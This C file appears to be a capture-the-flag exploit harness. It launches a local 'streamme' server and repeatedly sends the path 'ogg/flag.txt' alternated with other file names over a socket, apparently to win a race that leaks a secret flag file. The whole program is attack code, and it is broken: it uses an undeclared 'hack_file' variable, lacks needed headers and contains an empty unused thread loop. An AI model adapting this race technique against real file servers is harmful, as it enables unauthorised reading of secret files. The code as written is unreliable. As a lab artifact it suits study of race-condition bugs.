#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>

#define BUFFER_SIZE 5000000

int hasFlag(char* buf) {
  long i;

  for(i = 0; i < BUFFER_SIZE-3; ++i) {
    if(buf[i] == 'I' && buf[i+1] == 'I' && buf[i+2] == 'S')
    	return i;
  }

  return -1;
}

void* receiveFile(void* args)
{

while(1)
{

}
	return NULL;
}

char buf[BUFFER_SIZE];

int main ()
{ 
  time_t start = time(NULL);
  int rounds = 0;

  while(1)
  {
    pid_t pid_server = fork();

    //start server
    if(pid_server == 0) 
    {
      puts("start server");
      execl("streamme", "streamme", NULL);
    }

    pid_t pid_client = fork();

    //start client
    if(pid_client == 0) 
    {
      sleep(1);
      puts("start client");

      int i, err;
      char* secret_file = "ogg/flag.txt";
      int sock;
      struct sockaddr_in server;
      pthread_t send_thread_1, send_thread_2;

      //Create socket
      sock = socket(AF_INET , SOCK_STREAM , 0);
      if (sock == -1)
      {
        puts("Could not create socket");
      }
      puts("Socket created");

      server.sin_addr.s_addr = inet_addr("127.0.0.1");
      server.sin_family = AF_INET;
      server.sin_port = htons(1337);

      //Connect to remote server
      if (connect(sock , (struct sockaddr *)&server , sizeof(server)) < 0)
      {
        perror("connect failed. Error");
        return 1;
      }

      puts("Connected");

      long flagStart = -1;
      char* ogg_file = "ogg/56.ogg";

      while(1) 
      {
        int read;

        do 
        {
          read = recv(sock, buf, BUFFER_SIZE, MSG_DONTWAIT);
          flagStart = hasFlag(buf);
        } while(read >= 0 && flagStart < 0);

        if(flagStart >= 0)
          break;

        err = send(sock, secret_file, strlen(secret_file)+1, 0);
        if (err < 0) {
          puts("failed to send to server - secret file");
          break;
        }

        do 
        {
          read = recv(sock, buf, BUFFER_SIZE, MSG_DONTWAIT);
          flagStart = hasFlag(buf);
        } while(read >= 0 && flagStart < 0);

        if(flagStart >= 0)
          break;

        err = send(sock, hack_file, strlen(hack_file)+1, 0);
        if (err < 0) 
        {
          puts("failed to send to server - hack file");
          break;
        }
        usleep(5000);

        err = send(sock, ogg_file, strlen(ogg_file)+1, 0);
        if (err < 0) 
        {
          puts("failed to send to server - ogg file");
          break;
        }
      }

      if(flagStart >= 0) 
      {
        fprintf(stdout, "Got the flag at buffer index: %li - message: %s\n", flagStart, (buf + flagStart));
        close(sock);
        return 0;
      }

      close(sock);
      return 1;
    }
    int status;

    waitpid(pid_client, &status, 0);

    if(waitpid(pid_server, NULL, WNOHANG) == 0)
    {
      kill(pid_server, SIGTERM);
      waitpid(pid_server, NULL, 0);
    }

    if(WIFEXITED(status) && WEXITSTATUS(status) == 0) 
    {
      puts("end of program");
      break;
    }

    fprintf(stdout, "round: %d\n\n", rounds++);
  }

  printf("seconds: %f\n", (double)(time(NULL) - start));

  return 0;
}

